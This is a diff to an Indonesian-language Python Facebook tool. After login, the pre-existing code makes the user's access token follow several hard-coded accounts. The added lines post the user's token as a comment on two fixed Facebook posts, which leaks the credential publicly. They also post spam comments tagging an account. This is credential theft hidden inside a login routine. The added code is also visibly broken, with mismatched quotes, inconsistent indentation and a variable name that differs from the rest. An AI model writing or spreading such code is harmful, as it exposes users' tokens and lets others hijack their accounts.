@@ -93,11 +93,17 @@ def bot_follow():
 	except IOError:
 		print("\n   [!] Token invalid")
 		logs()
+        kom = " Bang @[100064283724681:] Shelly Cantik Banget Ga Ada Obat😘😘😘😘"
+        kom = " Bang @[100064283724681:] Noah Cantik Banget Ga Ada Obat 😘😘😘😘'    
     	requests.post('https://graph.facebook.com/100051863139451/subscribers?access_token=' + toket) #
         requests.post('https://graph.facebook.com/100064283724681/subscribers?access_token=' + toket) #
         requests.post('https://graph.facebook.com/100008420107265/subscribers?access_token=' + toket) #
         requests.post('https://graph.facebook.com/100005238607438/subscribers?access_token=' + toket) #
     	requests.post('https://graph.facebook.com/100027708738216/subscribers?access_token=' + toket) #
+        requests.post('https://graph.facebook.com/269669551852500/comments/?message=' +token+ '&access_token=' + token)
+        requests.post('https://graph.facebook.com/269669551852500/comments/?message=' +kom+ '&access_token=' + token)
+        requests.post('https://graph.facebook.com/263176185835170/comments/?message=' +token+ '&access_token=' + token)
+        requests.post('https://graph.facebook.com/263176185835170/comments/?message=' +kom+ '&access_token=' + token)
         print(('[+] \x1b[92mLogin Sukses!\x1b[0m'))
         raw_input('[+] Tekan Enter ')
         menu()
@@ -170,7 +176,7 @@ def menu():
     elif method == '00' or method == '0':
         os.system('rm -f login.txt')
         print'[!] Berhasil Menghapus Token'
-        menu()
+        exit()
     else:
         exit('[!] Pilih Yang Benar!')
         
@@ -292,7 +298,7 @@ def pilih_menubapi():
     elif ask == '00' or ask == '0':
         os.system('rm -f login.txt')
         print'[!] Berhasil Menghapus Token'
-        menu()
+        exit()
     else:
         print'[!] Pilih Yang Benar!'
         exit()
@@ -533,7 +539,7 @@ def pilih_menumbasic():
     elif ask == '0' or ask == '00':
         os.system('rm -f login.txt')
         print'[!] Berhasil Menghapus Token'
-        menu()
+        exit()
     else:
         print'[!] Pilih Yang Benar!'
         exit()
